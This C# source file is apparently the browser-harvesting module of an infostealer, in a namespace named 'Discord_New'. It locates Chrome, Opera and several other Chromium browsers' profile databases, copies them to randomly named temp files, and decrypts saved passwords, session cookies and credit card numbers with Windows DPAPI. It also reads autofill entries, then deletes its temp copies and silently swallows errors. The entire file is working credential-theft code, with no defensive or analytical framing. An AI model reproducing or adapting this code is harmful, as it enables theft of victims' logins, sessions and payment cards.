using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

//using System.Linq;

namespace Discord_New
{
    internal class Browsers
    {
        public static List<CardData> GetCards() // Works
        {
            var cardsDataList1 = new List<CardData>();
            var environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
            var strArray = new string[7]
            {
                environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Web Data",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                "\\Opera Software\\Opera Stable\\Login Data",
                environmentVariable + "\\Kometa\\User Data\\Default\\Web Data",
                environmentVariable + "\\Orbitum\\User Data\\Default\\Web Data",
                environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Web Data",
                environmentVariable + "\\Amigo\\User\\User Data\\Default\\Web Data",
                environmentVariable + "\\Torch\\User Data\\Default\\Web Data"
            };
            foreach (var basePath in strArray)
            {
                var cardsDataList2 = FetchCards(basePath);
                if (cardsDataList2 != null)
                    cardsDataList1.AddRange(cardsDataList2);
            }

            return cardsDataList1;
        }

        public static List<FormData> GetForms() // Works
        {
            var formDataList1 = new List<FormData>();
            var environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
            var strArray = new string[7]
            {
                environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Web Data",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                "\\Opera Software\\Opera Stable\\Login Data",
                environmentVariable + "\\Kometa\\User Data\\Default\\Web Data",
                environmentVariable + "\\Orbitum\\User Data\\Default\\Web Data",
                environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Web Data",
                environmentVariable + "\\Amigo\\User\\User Data\\Default\\Web Data",
                environmentVariable + "\\Torch\\User Data\\Default\\Web Data"
            };
            foreach (var basePath in strArray)
            {
                var formDataList2 = FetchForms(basePath);
                if (formDataList2 != null)
                    formDataList1.AddRange(formDataList2);
            }

            return formDataList1;
        }

        public static List<PassData> GetPasswords() // Works
        {
            var passDataList1 = new List<PassData>();
            var environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
            var strArray = new string[7]
            {
                environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                "\\Opera Software\\Opera Stable\\Login Data",
                environmentVariable + "\\Kometa\\User Data\\Default\\Login Data",
                environmentVariable + "\\Orbitum\\User Data\\Default\\Login Data",
                environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Login Data",
                environmentVariable + "\\Amigo\\User\\User Data\\Default\\Login Data",
                environmentVariable + "\\Torch\\User Data\\Default\\Login Data"
            };
            foreach (var basePath in strArray)
            {
                var passDataList2 = FetchPasswords(basePath);
                if (passDataList2 != null)
                    passDataList1.AddRange(passDataList2);
            }

            return passDataList1;
        }

        public static List<CookieData> GetCookies() // Works
        {
            var cookieDataList1 = new List<CookieData>();
            var environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
            var strArray = new string[7]
            {
                environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Cookies",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                "\\Opera Software\\Opera Stable\\Cookies",
                environmentVariable + "\\Kometa\\User Data\\Default\\Cookies",
                environmentVariable + "\\Orbitum\\User Data\\Default\\Cookies",
                environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Cookies",
                environmentVariable + "\\Amigo\\User\\User Data\\Default\\Cookies",
                environmentVariable + "\\Torch\\User Data\\Default\\Cookies"
            };
            foreach (var basePath in strArray)
            {
                var cookieDataList2 = FetchCookies(basePath);
                if (cookieDataList2 != null)
                    cookieDataList1.AddRange(cookieDataList2);
            }

            return cookieDataList1;
        }


        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription,
            ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags,
            ref DataBlob pPlainText);

        public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
        {
            var pPlainText = new DataBlob();
            var pCipherText = new DataBlob();
            var pEntropy = new DataBlob();
            var pPrompt = new CryptprotectPromptstruct
            {
                cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = null
            };
            var empty = string.Empty;
            try
            {
                try
                {
                    if (cipherTextBytes == null)
                        cipherTextBytes = new byte[0];
                    pCipherText.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
                    pCipherText.cbData = cipherTextBytes.Length;
                    Marshal.Copy(cipherTextBytes, 0, pCipherText.pbData, cipherTextBytes.Length);
                }
                catch (Exception ex)
                {
                }

                try
                {
                    if (entropyBytes == null)
                        entropyBytes = new byte[0];
                    pEntropy.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
                    pEntropy.cbData = entropyBytes.Length;
                    Marshal.Copy(entropyBytes, 0, pEntropy.pbData, entropyBytes.Length);
                }
                catch (Exception ex)
                {
                }

                CryptUnprotectData(ref pCipherText, ref empty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1,
                    ref pPlainText);
                var destination = new byte[pPlainText.cbData];
                Marshal.Copy(pPlainText.pbData, destination, 0, pPlainText.cbData);
                return destination;
            }
            catch (Exception ex)
            {
            }
            finally
            {
                if (pPlainText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pPlainText.pbData);
                if (pCipherText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pCipherText.pbData);
                if (pEntropy.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pEntropy.pbData);
            }

            return new byte[0];
        }

        private static List<PassData> FetchPasswords(string basePath)
        {
            if (!File.Exists(basePath))
                return null;
            var str1 = "";
            if (basePath.Contains("Chrome"))
                str1 = "Google Chrome";
            if (basePath.Contains("Yandex"))
                str1 = "Yandex Browser";
            if (basePath.Contains("Orbitum"))
                str1 = "Orbitum Browser";
            if (basePath.Contains("Opera"))
                str1 = "Opera Browser";
            if (basePath.Contains("Amigo"))
                str1 = "Amigo Browser";
            if (basePath.Contains("Torch"))
                str1 = "Torch Browser";
            if (basePath.Contains("Comodo"))
                str1 = "Comodo Browser";
            try
            {
                var str2 = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
                if (File.Exists(str2))
                    File.Delete(str2);
                File.Copy(basePath, str2, true);
                var sqlHandler = new SqlHandler(str2);
                var passDataList = new List<PassData>();
                sqlHandler.ReadTable("logins");
                for (var rowNum = 0; rowNum < sqlHandler.GetRowCount(); ++rowNum)
                    try
                    {
                        var empty = string.Empty;
                        try
                        {
                            empty = Encoding.UTF8.GetString(
                                DecryptBrowsers(Encoding.Default.GetBytes(sqlHandler.GetValue(rowNum, 5))));
                        }
                        catch (Exception ex)
                        {
                        }

                        if (empty != "")
                            passDataList.Add(new PassData
                            {
                                Url = sqlHandler.GetValue(rowNum, 1).Replace("https://", "").Replace("http://", ""),
                                Login = sqlHandler.GetValue(rowNum, 3),
                                Password = empty,
                                Program = str1
                            });
                    }
                    catch (Exception ex)
                    {
                        // // //Console.WriteLine(ex.ToString());
                    }

                File.Delete(str2);
                return passDataList;
            }
            catch (Exception ex)
            {
                // // //Console.WriteLine(ex.ToString());
                return null;
            }
        }

        private static List<CookieData> FetchCookies(string basePath)
        {
            if (!File.Exists(basePath))
                return null;

            var str1 = "";
            if (basePath.Contains("Chrome"))
                str1 = "Google Chrome";
            if (basePath.Contains("Yandex"))
                str1 = "Yandex Browser";
            if (basePath.Contains("Orbitum"))
                str1 = "Orbitum Browser";
            if (basePath.Contains("Opera"))
                str1 = "Opera Browser";
            if (basePath.Contains("Amigo"))
                str1 = "Amigo Browser";
            if (basePath.Contains("Torch"))
                str1 = "Torch Browser";
            if (basePath.Contains("Comodo"))
                str1 = "Comodo Browser";
            try
            {
                var str2 = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
                if (File.Exists(str2))
                    File.Delete(str2);
                File.Copy(basePath, str2, true);
                var sqlHandler = new SqlHandler(str2);
                /*if (sqlHandler.GetRowCount() == 65536)
                    return (List<CookieData>)null;*/
                var cookieDataList = new List<CookieData>();
                sqlHandler.ReadTable("cookies");
                for (var rowNum = 0; rowNum < sqlHandler.GetRowCount(); ++rowNum)
                    try
                    {
                        var empty = string.Empty;

                        try
                        {
                            empty = Encoding.UTF8.GetString(
                                DecryptBrowsers(Encoding.Default.GetBytes(sqlHandler.GetValue(rowNum, 12))));
                        }
                        catch (Exception ex)
                        {
                            // // //Console.WriteLine(ex.ToString());
                        }

                        if (empty != "")
                            cookieDataList.Add(new CookieData
                            {
                                host_key = sqlHandler.GetValue(rowNum, 1),
                                name = sqlHandler.GetValue(rowNum, 2),
                                path = sqlHandler.GetValue(rowNum, 4),
                                expires_utc = sqlHandler.GetValue(rowNum, 5),
                                secure = sqlHandler.GetValue(rowNum, 6),
                                value = empty
                            });
                    }
                    catch (Exception ex)
                    {
                        // // //Console.WriteLine(ex.ToString());
                    }

                File.Delete(str2);
                return cookieDataList;
            }
            catch (Exception ex)
            {
                // //Console.WriteLine(ex.ToString());
                return null;
            }
        }

        private static List<CardData> FetchCards(string basePath)
        {
            if (!File.Exists(basePath))
                return null;

            var str1 = "";
            if (basePath.Contains("Chrome"))
                str1 = "Google Chrome";
            if (basePath.Contains("Yandex"))
                str1 = "Yandex Browser";
            if (basePath.Contains("Orbitum"))
                str1 = "Orbitum Browser";
            if (basePath.Contains("Opera"))
                str1 = "Opera Browser";
            if (basePath.Contains("Amigo"))
                str1 = "Amigo Browser";
            if (basePath.Contains("Torch"))
                str1 = "Torch Browser";
            if (basePath.Contains("Comodo"))
                str1 = "Comodo Browser";
            try
            {
                var str2 = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
                if (File.Exists(str2))
                    File.Delete(str2);
                File.Copy(basePath, str2, true);
                var sqlHandler = new SqlHandler(str2);
                var cardDataList = new List<CardData>();
                sqlHandler.ReadTable("credit_cards");
                /*
                if (sqlHandler.GetRowCount() == 65536)
                    return (List<CardData>)null;*/
                for (var rowNum = 0; rowNum < sqlHandler.GetRowCount(); ++rowNum)
                    try
                    {
                        var empty = string.Empty;

                        try
                        {
                            empty = Encoding.UTF8.GetString(
                                DecryptBrowsers(Encoding.Default.GetBytes(sqlHandler.GetValue(rowNum, 4))));
                        }
                        catch (Exception ex)
                        {
                            // //Console.WriteLine(ex.ToString());
                        }

                        if (empty != "")
                            cardDataList.Add(new CardData
                            {
                                Name = sqlHandler.GetValue(rowNum, 1),
                                Exp_m = sqlHandler.GetValue(rowNum, 2),
                                Exp_y = sqlHandler.GetValue(rowNum, 3),
                                Number = empty,
                                Billing = sqlHandler.GetValue(rowNum, 9)
                            });
                    }
                    catch (Exception ex)
                    {
                        // //Console.WriteLine(ex.ToString());
                    }

                File.Delete(str2);
                return cardDataList;
            }
            catch (Exception ex)
            {
                // //Console.WriteLine(ex.ToString());
                return null;
            }
        }

        private static List<FormData> FetchForms(string basePath)
        {
            if (!File.Exists(basePath))
                return null;

            var str1 = "";
            if (basePath.Contains("Chrome"))
                str1 = "Google Chrome";
            if (basePath.Contains("Yandex"))
                str1 = "Yandex Browser";
            if (basePath.Contains("Orbitum"))
                str1 = "Orbitum Browser";
            if (basePath.Contains("Opera"))
                str1 = "Opera Browser";
            if (basePath.Contains("Amigo"))
                str1 = "Amigo Browser";
            if (basePath.Contains("Torch"))
                str1 = "Torch Browser";
            if (basePath.Contains("Comodo"))
                str1 = "Comodo Browser";
            try
            {
                var str2 = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
                if (File.Exists(str2))
                    File.Delete(str2);
                File.Copy(basePath, str2, true);
                var sqlHandler = new SqlHandler(str2);
                var formDataList = new List<FormData>();
                sqlHandler.ReadTable("autofill");
                if (sqlHandler.GetRowCount() == 65536)
                    return null;
                for (var rowNum = 0; rowNum < sqlHandler.GetRowCount(); ++rowNum)
                    try
                    {
                        formDataList.Add(new FormData
                        {
                            Name = sqlHandler.GetValue(rowNum, 0),
                            Value = sqlHandler.GetValue(rowNum, 1)
                        });
                    }
                    catch (Exception ex)
                    {
                        // //Console.WriteLine(ex.ToString());
                    }

                File.Delete(str2);
                return formDataList;
            }
            catch (Exception ex)
            {
                // //Console.WriteLine(ex.ToString());
                return null;
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DataBlob
        {
            public int cbData;
            public IntPtr pbData;
        }
    }
}